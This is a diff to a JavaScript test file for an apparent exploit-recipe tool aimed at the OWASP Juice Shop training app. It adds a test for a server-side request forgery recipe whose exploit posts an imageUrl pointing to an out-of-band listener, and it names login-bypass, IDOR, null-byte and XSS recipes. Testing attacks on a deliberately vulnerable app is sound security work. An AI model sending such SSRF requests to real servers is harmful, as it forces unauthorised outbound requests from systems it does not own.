@@ -28,7 +28,7 @@ test("a recognized target name with an unrecognized config shape gets no recipes
   assert.deepEqual(getRecipesForTarget({ name: "juice-shop-v17.3.0", config: "nope" }), []);
 });
 
-test("juice-shop-v17.3.0 returns the four HTTP recipes and the DOM XSS recipe", () => {
+test("juice-shop-v17.3.0 returns the five HTTP/OOB recipes and the DOM XSS recipe", () => {
   const recipes = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG });
   assert.deepEqual(
     recipes.map((r) => r.id),
@@ -37,6 +37,7 @@ test("juice-shop-v17.3.0 returns the four HTTP recipes and the DOM XSS recipe", 
       "juice-shop-login-bypass",
       "juice-shop-idor-basket",
       "juice-shop-ftp-poison-null-byte",
+      "juice-shop-ssrf-profile-image",
       "juice-shop-dom-xss-search",
     ],
   );
@@ -365,6 +366,27 @@ test("ftp-poison-null-byte oracle: package.json.bak content is true; legal.md or
   assert.equal(await recipe.oracleCheck({ status: 200, body: "# Legal Information\n..." }, canary), false);
   assert.equal(await recipe.oracleCheck({ status: 200, body: JSON.stringify({ name: "other" }) }, canary), false);
   assert.equal(await recipe.oracleCheck({ status: 403, body: backupPkg }, canary), false);
+});
+
+test("ssrf-profile-image recipe configures an oobListener, captures userToken, and sends {{oobUrl}}/{{canary}}.jpg", () => {
+  const recipe = getRecipesForTarget({ name: "juice-shop-v17.3.0", config: CONFIG }).find(
+    (r) => r.id === "juice-shop-ssrf-profile-image",
+  );
+  assert.ok(recipe);
+  assert.deepEqual(recipe.oobListener, { port: 8080 });
+  assert.equal(recipe.setup?.length, 1);
+  assert.deepEqual(recipe.negativeControl, {
+    method: "GET",
+    path: "/profile",
+    headers: { Cookie: "token={{userToken}}" },
+  });
+  assert.deepEqual(recipe.negativeControlAcceptedStatuses, [302]);
+  assert.deepEqual(recipe.exploit, {
+    method: "POST",
+    path: "/profile/image/url",
+    headers: { Cookie: "token={{userToken}}" },
+    body: { imageUrl: "{{oobUrl}}/{{canary}}.jpg" },
+  });
 });
 
 // The four onboarding targets beyond juice-shop. These validate the recipe lookup and each
